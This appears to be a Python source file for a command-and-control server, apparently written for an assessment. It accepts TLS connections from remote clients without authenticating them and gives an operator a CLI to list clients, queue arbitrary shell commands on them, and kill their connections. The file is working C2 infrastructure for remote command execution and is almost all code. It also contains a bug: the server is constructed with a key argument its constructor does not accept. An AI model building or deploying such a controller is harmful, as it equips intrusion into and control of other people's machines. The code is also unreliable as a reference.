"""
C2 Server Implementation
Supports Steps 1-5 with modular design

Author: [Candidate]
References: 
- AsyncIO patterns: https://stackoverflow.com/questions/48506460/python-simple-socket-client-server-using-asyncio
- C2 Architecture: https://www.scip.ch/en/?labs.20250612
"""

import asyncio
import logging
import time
import os
import uuid
import argparse
import base64
from typing import Dict, List
from models.message import Message
from models.send_receive_msgs import send_message, receive_message
from models.client_manager import ClientManager
from models.message_type import MessageType
from models.command_type import CommandType
from models.tls_helper import TLSSessionHelper

# ==================== CONFIGURATION ====================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(name)s|%(funcName)s:%(lineno)d] %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== CORE C2 LOGIC ====================

class C2Server:
    """Main C2 Server"""
    
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.shutdown = asyncio.Event()
        self._server: asyncio.base_events.Server | None = None
        self.client_manager = ClientManager()
    
    async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """
        Handle new client connection
        """
        try:
            client_state = await self.client_manager.register_client(reader, writer)
            if client_state:
                await self.client_manager.handle_client_loop(client_state)
        except asyncio.CancelledError:
            logger.info("Client handler cancelled")
        except Exception as e:
            logger.error(f"Client handler error: {e}")



    async def start_server(self):
        """Start the C2 server"""
        ssl_ctx = TLSSessionHelper().create_context(
            is_server=True,
            certfile=".auth/server.crt",
            keyfile=".auth/server.key",
            cafile=None, # no client authentication
            require_client_cert=False
        )

        self._server = await asyncio.start_server(
            self.handle_client,
            self.host,
            self.port,
            ssl=ssl_ctx
        )
        addr = self._server.sockets[0].getsockname()
        logger.info(f"C2 Server listening on {addr[0]}:{addr[1]}")
        async with self._server:
            try:
                logger.info("Server started")
                await self.shutdown.wait()
                logger.info("Server received shutdown event")
            except KeyboardInterrupt:
                logger.info("Server received Keyboard Interrupt event")
            except asyncio.CancelledError:
                logger.info("Server cancelled")
            except Exception as e:
                logger.error(f"Server error: {e}")
            finally:
                await self.stop()
                logger.info("Server stopped")

    async def stop(self):
        if not self._server:
            logger.info("Server not running, for some reason")
            return
        logger.info("Server closing...")
        await self.client_manager.close_all_clients()
        self._server.close()
        await self._server.wait_closed()


    
    # ==================== ADMIN CLI (STEP 1) ====================
    
    def cmd_list_clients(self):
        """List all connected clients"""
        self.client_manager.print_client_list()
    
    def cmd_run(self, args: str):
        """Run command on client"""
        parts = args.split(None, 1)
        if len(parts) < 2:
            logger.info("Command too short. Usage: run <client_id> <command>")
            return
        
        client_id, command = parts
        client = self.client_manager.get_client(client_id)
        
        if not client:
            logger.info(f"Client {client_id} not found")
            return
        
        if client.is_killed:
            logger.info(f"Client {client_id} was killed - not connected")
            return
        
        if not client.is_connected:
            logger.info(f"Client {client_id} not in connected state")
            return
        
        if self.client_manager.add_command_to_queue(client_id, command):
            logger.info(f"Command queued for {client_id}: {command}")
        else:
            logger.error(f"Failed to queue command for {client_id}")
    
    def cmd_kill(self, client_id: str):
        """Kill client connection"""
        if self.client_manager.kill_client(client_id):
            logger.info(f"Kill command sent to {client_id}")
        else:
            logger.info(f"Client {client_id} not found")


    
    async def admin_cli(self):
        """
        Admin CLI loop
        Runs in separate thread/coroutine
        """        
        try:
            while not self.shutdown.is_set():
                if self.shutdown.is_set():
                    break
                await asyncio.sleep(0.5)  # solves ">" being printed into log stream (most times)
                cmd = await asyncio.to_thread(input, "> ")
                if not cmd:
                    continue
                cmd_parts = cmd.lower().split(maxsplit=1)
                cmd_type = CommandType(cmd_parts[0])
                
                if cmd_type is CommandType.LIST:
                    self.cmd_list_clients()
                
                elif cmd_type is CommandType.EXIT:
                    logger.info('Exiting server')
                    self.shutdown.set()
                    break
                
                elif cmd_type is CommandType.RUN:
                    self.cmd_run(cmd_parts[1].strip())
                
                elif cmd_type is CommandType.KILL:
                    self.cmd_kill(cmd_parts[1].strip())
                
                elif cmd_type is CommandType.HELP:
                    print("""
Commands:
list              - List connected clients
run <id> <cmd>    - Run command on client
kill <id>         - Kill client
exit              - Exit server
                    """)
                
                else:
                    logger.info(f"Unknown command {cmd}. Type 'help'")
            
        except asyncio.CancelledError:
            logger.info("CLI cancelled")
        except KeyboardInterrupt:
            logger.info("CLI received Keyboard Interrupt event")
        except Exception as e:
            logger.error(f"CLI error: {e}")

# ==================== MAIN ====================

async def main():
    parser = argparse.ArgumentParser(description="C2 Server")
    parser.add_argument("--host", default="0.0.0.0", help="Bind host")
    parser.add_argument("--port", type=int, default=5000, help="Bind port")
    parser.add_argument("--secret-key", help="Master key (32 hex chars for AES-256)")

    args = parser.parse_args()
    # Generate or parse key
    master_key = None
    if args.secret_key:
        try:
            master_key = bytes.fromhex(args.secret_key)
            if len(master_key) != 32:
                raise ValueError("Key must be 32 bytes")
        except:
            print("Error: --secret-key must be 64 hex characters (32 bytes)")
            return

    server = C2Server(args.host, args.port, master_key)
    
    # Run server and CLI concurrently
    await asyncio.gather(
        server.start_server(),
        server.admin_cli()
    )

if __name__ == "__main__":
    asyncio.run(main())